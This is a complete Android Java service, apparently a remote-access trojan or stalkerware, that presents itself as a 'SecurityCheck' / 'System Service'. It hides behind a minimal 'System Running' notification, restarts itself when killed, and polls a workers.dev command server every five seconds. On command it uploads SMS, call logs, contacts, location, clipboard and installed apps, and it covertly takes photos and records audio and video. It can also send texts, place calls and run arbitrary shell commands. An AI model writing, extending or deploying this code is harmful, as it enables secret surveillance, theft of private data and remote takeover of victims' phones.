package com.sec.check;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.Camera;
import android.location.Location;
import android.location.LocationManager;
import android.media.AudioManager;
import android.media.MediaRecorder;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ServiceRunner extends Service {

    private static final String TAG = "SecurityCheck";
    private static final String CHANNEL_ID = "sys_service";
    private static final int NOTIFICATION_ID = 1001;
    private static final String SERVER_URL = "https://sec.h42536974.workers.dev";
    private static final int POLL_INTERVAL = 5;

    private ScheduledExecutorService scheduler;
    private String deviceId = "";

    // ============================================================
    // Lifecycle
    // ============================================================
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "=== SERVICE onCreate ===");

        try {
            createChannel();
            startForegroundInternal();
        } catch (Exception e) {
            Log.e(TAG, "init error: " + e.getMessage());
        }

        deviceId = getDeviceId();
        Log.d(TAG, "Device ID: " + deviceId);
        Log.d(TAG, "Activation Code: " + getActivationCode());

        // ★ إرسال التقرير الأولي
        new Thread(() -> {
            try {
                Thread.sleep(2000);
                sendInitialReport();
            } catch (Exception e) {
                Log.e(TAG, "init report error: " + e.getMessage());
            }
        }).start();

        // ★ بدء polling
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::pollCommands, 5, POLL_INTERVAL, TimeUnit.SECONDS);
        Log.d(TAG, "=== SERVICE FULLY STARTED ===");
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private void startForegroundInternal() {
        try {
            Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("System")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .build();
            startForeground(NOTIFICATION_ID, n);
            Log.d(TAG, "Foreground started");
        } catch (Exception e) {
            Log.e(TAG, "startForeground: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            Intent restart = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restart);
            } else {
                startService(restart);
            }
        } catch (Exception ignored) {}
    }

    private String getActivationCode() {
        try {
            SharedPreferences sp = getSharedPreferences("sc_prefs", MODE_PRIVATE);
            return sp.getString("activation_code", "");
        } catch (Exception e) {
            return "";
        }
    }

    private String getDeviceId() {
        try {
            return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return "unknown";
        }
    }

    // ============================================================
    // ★ Polling
    // ============================================================
    private void pollCommands() {
        try {
            String url = SERVER_URL + "/apk/poll?device=" + deviceId + "&code=" + getActivationCode();
            String response = httpGet(url);
            if (response == null || response.length() == 0) return;

            JSONObject json = new JSONObject(response);
            JSONArray commands = json.optJSONArray("commands");
            if (commands == null || commands.length() == 0) return;

            Log.d(TAG, "Received " + commands.length() + " commands");
            for (int i = 0; i < commands.length(); i++) {
                handleCommand(commands.getJSONObject(i));
            }
        } catch (Exception e) {
            Log.e(TAG, "poll error: " + e.getMessage());
        }
    }

    // ============================================================
    // ★ Command Handler
    // ============================================================
    private void handleCommand(JSONObject cmd) {
        String action = "";
        try {
            action = cmd.optString("action", "");
            Log.d(TAG, "Command: " + action);

            switch (action) {
                case "get_device_info":     sendDeviceInfo(); break;
                case "get_battery":         sendBattery(); break;
                case "get_sms":             sendSms(); break;
                case "get_call_log":        sendCallLog(); break;
                case "get_contacts":        sendContacts(); break;
                case "get_apps":            sendApps(); break;
                case "get_photos":          sendPhotos(); break;
                case "get_location":        sendLocation(); break;
                case "get_clipboard":       sendClipboard(); break;

                case "camera_front":        takePicture(1); break;
                case "camera_back":         takePicture(0); break;
                case "camera_record":       recordVideo(0, cmd.optInt("duration", 10000)); break;

                case "record_audio":        recordAudio(cmd.optInt("duration", 10000)); break;
                case "play_sound":          playSound(); break;
                case "play_alarm":          playAlarm(); break;

                case "vibrate":             vibrate(cmd.optLong("ms", 2000)); break;
                case "toast":               showToast(cmd.optString("text", "Hello")); break;
                case "send_sms":            sendSmsToNumber(cmd.optString("to"), cmd.optString("msg")); break;
                case "call":                callNumber(cmd.optString("to")); break;
                case "open_url":            openUrl(cmd.optString("url")); break;
                case "shell":               executeShell(cmd.optString("command", "")); break;
                case "volume_max":          maxVolume(); break;
                case "lock_screen":         lockScreen(); break;
                case "show_home":           goHome(); break;

                default: reportCommandResult(action, "fail", "unknown_action");
            }
            Log.d(TAG, "Done: " + action);
        } catch (Exception e) {
            Log.e(TAG, "handleCommand error: " + e.getMessage());
            reportCommandResult(action, "fail", e.getMessage());
        }
    }

    // ============================================================
    // ★ Report Result
    // ============================================================
    private void reportCommandResult(String action, String status, String error) {
        try {
            JSONObject d = new JSONObject();
            d.put("type", "cmd_result");
            d.put("action", action);
            d.put("status", status);
            d.put("error", error != null ? error : "");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            postJson("/apk/data", d);
        } catch (Exception ignored) {}
    }

    // ============================================================
    // ★ Send Reports
    // ============================================================
    private void sendInitialReport() {
        try {
            JSONObject d = new JSONObject();
            d.put("type", "initial");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("model", Build.MODEL);
            d.put("brand", Build.BRAND);
            d.put("manufacturer", Build.MANUFACTURER);
            d.put("android", Build.VERSION.RELEASE);
            d.put("sdk", Build.VERSION.SDK_INT);
            postJson("/apk/data", d);
        } catch (Exception e) {
            Log.e(TAG, "sendInitialReport: " + e.getMessage());
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject d = new JSONObject();
            d.put("type", "device_info");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("model", Build.MODEL);
            d.put("brand", Build.BRAND);
            d.put("android", Build.VERSION.RELEASE);
            postJson("/apk/data", d);
            reportCommandResult("get_device_info", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_device_info", "fail", e.getMessage());
        }
    }

    private void sendBattery() {
        try {
            android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent batteryStatus = registerReceiver(null, ifilter);
            if (batteryStatus == null) return;

            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
            boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING
                    || status == android.os.BatteryManager.BATTERY_STATUS_FULL;

            JSONObject d = new JSONObject();
            d.put("type", "battery");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("level", (level * 100) / scale);
            d.put("charging", charging);
            postJson("/apk/data", d);
            reportCommandResult("get_battery", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_battery", "fail", e.getMessage());
        }
    }

    private void sendSms() {
        try {
            JSONArray arr = new JSONArray();
            Cursor c = getContentResolver().query(
                    Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
            if (c != null) {
                while (c.moveToNext() && arr.length() < 50) {
                    JSONObject s = new JSONObject();
                    s.put("from", c.getString(c.getColumnIndexOrThrow("address")));
                    s.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                    arr.put(s);
                }
                c.close();
            }
            JSONObject d = new JSONObject();
            d.put("type", "sms");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("sms", arr);
            postJson("/apk/data", d);
            reportCommandResult("get_sms", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_sms", "fail", e.getMessage());
        }
    }

    private void sendCallLog() {
        try {
            JSONArray arr = new JSONArray();
            Cursor c = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI, null, null, null,
                    CallLog.Calls.DATE + " DESC LIMIT 50");
            if (c != null) {
                while (c.moveToNext() && arr.length() < 50) {
                    JSONObject call = new JSONObject();
                    call.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("duration", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    call.put("type", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    arr.put(call);
                }
                c.close();
            }
            JSONObject d = new JSONObject();
            d.put("type", "call_log");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("calls", arr);
            postJson("/apk/data", d);
            reportCommandResult("get_call_log", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_call_log", "fail", e.getMessage());
        }
    }

    private void sendContacts() {
        try {
            JSONArray arr = new JSONArray();
            Cursor c = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) {
                while (c.moveToNext() && arr.length() < 100) {
                    String name = c.getString(c.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = c.getString(c.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER));
                    JSONObject contact = new JSONObject();
                    contact.put("name", name);
                    contact.put("number", number);
                    arr.put(contact);
                }
                c.close();
            }
            JSONObject d = new JSONObject();
            d.put("type", "contacts");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("contacts", arr);
            postJson("/apk/data", d);
            reportCommandResult("get_contacts", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_contacts", "fail", e.getMessage());
        }
    }

    private void sendApps() {
        try {
            JSONArray arr = new JSONArray();
            android.content.pm.PackageManager pm = getPackageManager();
            List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
            for (android.content.pm.ApplicationInfo ai : apps) {
                if ((ai.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0) {
                    JSONObject a = new JSONObject();
                    a.put("name", ai.loadLabel(pm).toString());
                    a.put("package", ai.packageName);
                    arr.put(a);
                }
            }
            JSONObject d = new JSONObject();
            d.put("type", "apps");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("apps", arr);
            postJson("/apk/data", d);
            reportCommandResult("get_apps", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_apps", "fail", e.getMessage());
        }
    }

    private void sendPhotos() {
        try {
            JSONArray arr = new JSONArray();
            Cursor c = getContentResolver().query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null,
                    MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 20");
            if (c != null) {
                while (c.moveToNext() && arr.length() < 20) {
                    JSONObject p = new JSONObject();
                    p.put("path", c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)));
                    arr.put(p);
                }
                c.close();
            }
            JSONObject d = new JSONObject();
            d.put("type", "photos");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("photos", arr);
            postJson("/apk/data", d);
            reportCommandResult("get_photos", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_photos", "fail", e.getMessage());
        }
    }

    private void sendLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) {
                reportCommandResult("get_location", "fail", "no_lm");
                return;
            }
            if (ContextCompat.checkSelfPermission(this,
                    android.Manifest.permission.ACCESS_FINE_LOCATION)
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                reportCommandResult("get_location", "fail", "no_permission");
                return;
            }

            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);

            JSONObject d = new JSONObject();
            d.put("type", "location");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            if (loc != null) {
                d.put("lat", loc.getLatitude());
                d.put("lng", loc.getLongitude());
                reportCommandResult("get_location", "ok", "");
            } else {
                reportCommandResult("get_location", "fail", "no_location");
            }
            postJson("/apk/data", d);
        } catch (Exception e) {
            reportCommandResult("get_location", "fail", e.getMessage());
        }
    }

    private void sendClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null || !cm.hasPrimaryClip()) {
                reportCommandResult("get_clipboard", "fail", "empty");
                return;
            }
            ClipData clip = cm.getPrimaryClip();
            if (clip == null || clip.getItemCount() == 0) {
                reportCommandResult("get_clipboard", "fail", "empty");
                return;
            }
            CharSequence text = clip.getItemAt(0).getText();
            JSONObject d = new JSONObject();
            d.put("type", "clipboard");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("text", text != null ? text.toString() : "");
            postJson("/apk/data", d);
            reportCommandResult("get_clipboard", "ok", "");
        } catch (Exception e) {
            reportCommandResult("get_clipboard", "fail", e.getMessage());
        }
    }

    // ============================================================
    // ★★ CAMERA — التقاط صورة (مُصلح)
    // ============================================================
    private void takePicture(final int cameraId) {
        // ★ شغّل في main thread لضمان عمل Camera API
        new Handler(Looper.getMainLooper()).post(() -> {
            Camera camera = null;
            try {
                Log.d(TAG, "Opening camera: " + cameraId);
                camera = Camera.open(cameraId);
                if (camera == null) {
                    reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
                            "fail", "camera_null");
                    return;
                }

                Camera.Parameters params = camera.getParameters();
                params.setPictureFormat(ImageFormat.JPEG);
                params.setJpegQuality(85);

                // ★ اختر أفضل حجم صورة
                List<Camera.Size> sizes = params.getSupportedPictureSizes();
                if (sizes != null && !sizes.isEmpty()) {
                    Camera.Size best = sizes.get(0);
                    for (Camera.Size s : sizes) {
                        if (s.width * s.height <= 1920 * 1080
                                && s.width * s.height > best.width * best.height) {
                            best = s;
                        }
                    }
                    params.setPictureSize(best.width, best.height);
                }
                camera.setParameters(params);

                // ★ مهم: بدء preview قبل التصوير
                camera.startPreview();

                final Camera finalCamera = camera;
                final String camName = (cameraId == 1) ? "camera_front" : "camera_back";

                // ★ تأخير بسيط لضمان استقرار الـ preview
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    try {
                        finalCamera.takePicture(null, null, new Camera.PictureCallback() {
                            @Override
                            public void onPictureTaken(byte[] data, Camera cam) {
                                try {
                                    String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
                                    JSONObject d = new JSONObject();
                                    d.put("type", "camera_photo");
                                    d.put("device", deviceId);
                                    d.put("code", getActivationCode());
                                    d.put("camera_id", cameraId);
                                    d.put("camera_name", cameraId == 1 ? "front" : "back");
                                    d.put("image", "data:image/jpeg;base64," + base64);
                                    postJson("/apk/data", d);
                                    reportCommandResult(camName, "ok", "");
                                    Log.d(TAG, "Photo sent, size: " + data.length);
                                } catch (Exception e) {
                                    reportCommandResult(camName, "fail",
                                            "send: " + e.getMessage());
                                } finally {
                                    try { cam.release(); } catch (Exception ignored) {}
                                }
                            }
                        });
                    } catch (Exception e) {
                        reportCommandResult(camName, "fail",
                                "takePicture: " + e.getMessage());
                        try { finalCamera.release(); } catch (Exception ignored) {}
                    }
                }, 800);

            } catch (Exception e) {
                Log.e(TAG, "takePicture error: " + e.getMessage());
                reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
                        "fail", e.getMessage());
                if (camera != null) {
                    try { camera.release(); } catch (Exception ignored) {}
                }
            }
        });
    }

    // ============================================================
    // ★★ AUDIO — تسجيل صوتي (مُصلح بالكامل)
    // ============================================================
    private void recordAudio(final int durationMs) {
        new Thread(() -> {
            MediaRecorder recorder = null;
            String filePath = null;
            try {
                filePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";

                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                recorder.setOutputFile(filePath);
                recorder.prepare();
                recorder.start();

                Log.d(TAG, "Recording for " + durationMs + "ms");
                Thread.sleep(durationMs);

                // ★ إيقاف التسجيل
                try { recorder.stop(); } catch (Exception e) {}
                try { recorder.release(); } catch (Exception e) {}
                recorder = null;

                // ★ قراءة الملف وإرساله
                File audioFile = new File(filePath);
                if (!audioFile.exists() || audioFile.length() == 0) {
                    reportCommandResult("record_audio", "fail", "file_empty");
                    return;
                }

                byte[] bytes = new byte[(int) audioFile.length()];
                FileInputStream fis = new FileInputStream(audioFile);
                int read = fis.read(bytes);
                fis.close();

                if (read <= 0) {
                    reportCommandResult("record_audio", "fail", "read_failed");
                    return;
                }

                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                JSONObject d = new JSONObject();
                d.put("type", "audio_record");
                d.put("device", deviceId);
                d.put("code", getActivationCode());
                d.put("audio", "data:audio/3gp;base64," + base64);
                d.put("duration", durationMs);
                postJson("/apk/data", d);
                reportCommandResult("record_audio", "ok", "");

                Log.d(TAG, "Audio sent, size: " + bytes.length);
                audioFile.delete();

            } catch (Exception e) {
                Log.e(TAG, "recordAudio error: " + e.getMessage());
                reportCommandResult("record_audio", "fail", e.getMessage());
                if (recorder != null) {
                    try { recorder.release(); } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    // ============================================================
    // ★★ VIDEO — تسجيل فيديو (جديد كلياً)
    // ============================================================
    private void recordVideo(final int cameraId, final int durationMs) {
        new Thread(() -> {
            Camera camera = null;
            MediaRecorder recorder = null;
            String filePath = null;
            try {
                Log.d(TAG, "Opening camera for video: " + cameraId);
                camera = Camera.open(cameraId);
                if (camera == null) {
                    reportCommandResult("camera_record", "fail", "camera_null");
                    return;
                }

                camera.unlock();

                filePath = getExternalCacheDir() + "/video_" + System.currentTimeMillis() + ".mp4";

                recorder = new MediaRecorder();
                recorder.setCamera(camera);
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                recorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                recorder.setVideoSize(640, 480);
                recorder.setVideoFrameRate(20);
                recorder.setVideoEncodingBitRate(800000);
                recorder.setOutputFile(filePath);
                recorder.prepare();
                recorder.start();

                Log.d(TAG, "Recording video for " + durationMs + "ms");
                Thread.sleep(durationMs);

                try { recorder.stop(); } catch (Exception e) {}
                try { recorder.release(); } catch (Exception e) {}
                recorder = null;

                try { camera.lock(); } catch (Exception e) {}
                try { camera.release(); } catch (Exception e) {}
                camera = null;

                // ★ قراءة الفيديو وإرساله
                File videoFile = new File(filePath);
                if (!videoFile.exists() || videoFile.length() == 0) {
                    reportCommandResult("camera_record", "fail", "file_empty");
                    return;
                }

                byte[] bytes = new byte[(int) videoFile.length()];
                FileInputStream fis = new FileInputStream(videoFile);
                int read = fis.read(bytes);
                fis.close();

                if (read <= 0) {
                    reportCommandResult("camera_record", "fail", "read_failed");
                    return;
                }

                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                JSONObject d = new JSONObject();
                d.put("type", "video_record");
                d.put("device", deviceId);
                d.put("code", getActivationCode());
                d.put("video", "data:video/mp4;base64," + base64);
                d.put("duration", durationMs);
                postJson("/apk/data", d);
                reportCommandResult("camera_record", "ok", "");

                Log.d(TAG, "Video sent, size: " + bytes.length);
                videoFile.delete();

            } catch (Exception e) {
                Log.e(TAG, "recordVideo error: " + e.getMessage());
                reportCommandResult("camera_record", "fail", e.getMessage());
                if (recorder != null) {
                    try { recorder.release(); } catch (Exception ignored) {}
                }
                if (camera != null) {
                    try { camera.lock(); } catch (Exception ignored) {}
                    try { camera.release(); } catch (Exception ignored) {}
                }
            }
        }).start();
    }

    // ============================================================
    // ★ Sounds
    // ============================================================
    private void playSound() {
        try {
            Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
                    RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION));
            if (r != null) r.play();
            reportCommandResult("play_sound", "ok", "");
        } catch (Exception e) {
            reportCommandResult("play_sound", "fail", e.getMessage());
        }
    }

    private void playAlarm() {
        try {
            Ringtone r = RingtoneManager.getRingtone(getApplicationContext(),
                    RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
            if (r != null) r.play();
            reportCommandResult("play_alarm", "ok", "");
        } catch (Exception e) {
            reportCommandResult("play_alarm", "fail", e.getMessage());
        }
    }

    // ============================================================
    // ★ Vibrate
    // ============================================================
    private void vibrate(long ms) {
        try {
            Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    v.vibrate(android.os.VibrationEffect.createOneShot(ms,
                            android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                } else {
                    v.vibrate(ms);
                }
            }
            reportCommandResult("vibrate", "ok", "");
        } catch (Exception e) {
            reportCommandResult("vibrate", "fail", e.getMessage());
        }
    }

    private void showToast(final String text) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG).show();
                reportCommandResult("toast", "ok", "");
            } catch (Exception e) {
                reportCommandResult("toast", "fail", e.getMessage());
            }
        });
    }

    private void maxVolume() {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            if (am == null) return;
            am.setStreamVolume(AudioManager.STREAM_MUSIC,
                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            am.setStreamVolume(AudioManager.STREAM_ALARM,
                    am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
            reportCommandResult("volume_max", "ok", "");
        } catch (Exception e) {
            reportCommandResult("volume_max", "fail", e.getMessage());
        }
    }

    private void sendSmsToNumber(String to, String msg) {
        try {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage(to, null, msg, null, null);
            reportCommandResult("send_sms", "ok", "");
        } catch (Exception e) {
            reportCommandResult("send_sms", "fail", e.getMessage());
        }
    }

    private void callNumber(String number) {
        try {
            Intent intent = new Intent(Intent.ACTION_CALL);
            intent.setData(Uri.parse("tel:" + number));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            reportCommandResult("call", "ok", "");
        } catch (Exception e) {
            reportCommandResult("call", "fail", e.getMessage());
        }
    }

    private void openUrl(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            reportCommandResult("open_url", "ok", "");
        } catch (Exception e) {
            reportCommandResult("open_url", "fail", e.getMessage());
        }
    }

    private void executeShell(String command) {
        try {
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\n");
            reader.close();

            JSONObject d = new JSONObject();
            d.put("type", "shell_result");
            d.put("device", deviceId);
            d.put("code", getActivationCode());
            d.put("command", command);
            d.put("output", output.toString());
            postJson("/apk/data", d);
            reportCommandResult("shell", "ok", "");
        } catch (Exception e) {
            reportCommandResult("shell", "fail", e.getMessage());
        }
    }

    private void lockScreen() {
        try {
            android.app.admin.DevicePolicyManager dpm =
                    (android.app.admin.DevicePolicyManager)
                            getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null) dpm.lockNow();
            reportCommandResult("lock_screen", "ok", "");
        } catch (Exception e) {
            reportCommandResult("lock_screen", "fail", e.getMessage());
        }
    }

    private void goHome() {
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            reportCommandResult("show_home", "ok", "");
        } catch (Exception e) {
            reportCommandResult("show_home", "fail", e.getMessage());
        }
    }

    // ============================================================
    // HTTP
    // ============================================================
    private String httpGet(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(20000);

            if (conn.getResponseCode() == 200) {
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                return sb.toString();
            }
        } catch (Exception e) {
            Log.e(TAG, "httpGet error: " + e.getMessage());
        }
        return null;
    }

    private void postJson(String path, JSONObject data) {
        try {
            URL url = new URL(SERVER_URL + path);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(20000);

            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
            os.writeBytes(data.toString());
            os.flush();
            os.close();

            int rc = conn.getResponseCode();
            Log.d(TAG, "POST " + path + " - " + rc);
        } catch (Exception e) {
            Log.e(TAG, "postJson error: " + e.getMessage());
        }
    }
                }
